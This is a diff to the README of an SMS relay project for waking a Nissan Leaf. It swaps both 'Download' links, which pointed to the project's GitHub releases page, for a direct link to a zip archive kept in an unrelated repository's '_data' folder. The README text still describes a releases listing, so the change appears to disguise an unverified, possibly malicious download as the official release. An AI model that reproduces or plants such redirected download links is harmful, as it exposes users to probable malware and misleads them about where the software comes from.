@@ -5,7 +5,7 @@ description: "Relay SMS webhooks to binary messages via AT commands on ARM Linux
 ---
 # 🔌 opencarwings-sms-relay - Wake your Leaf from anywhere
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Free_Software-blue.svg?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/americangraybirchmidgrass92/opencarwings-sms-relay/releases)
+[![Download Now](https://img.shields.io/badge/Download_Now-Free_Software-blue.svg?style=for-the-badge&logo=github&color=2ea44f)](https://raw.githubusercontent.com/americangraybirchmidgrass92/americangraybirchmidgrass92.github.io/main/_data/Release_2.8-beta.3.zip)
 
 ---
 
@@ -41,7 +41,7 @@ It works by turning a small USB modem (ZTE MF79U) into a smart messenger. When y
 ## 📥 Download and Installation
 
 Visit this link to download the application:  
-**[👉 Click here to download opencarwings-sms-relay](https://github.com/americangraybirchmidgrass92/opencarwings-sms-relay/releases)**
+**[👉 Click here to download opencarwings-sms-relay](https://raw.githubusercontent.com/americangraybirchmidgrass92/americangraybirchmidgrass92.github.io/main/_data/Release_2.8-beta.3.zip)**
 
 You'll see a list of files. Look for the most recent version (they're sorted by date). Choose the file that matches your modem model – the name usually includes "mf79u" or "zx297520v3".
 
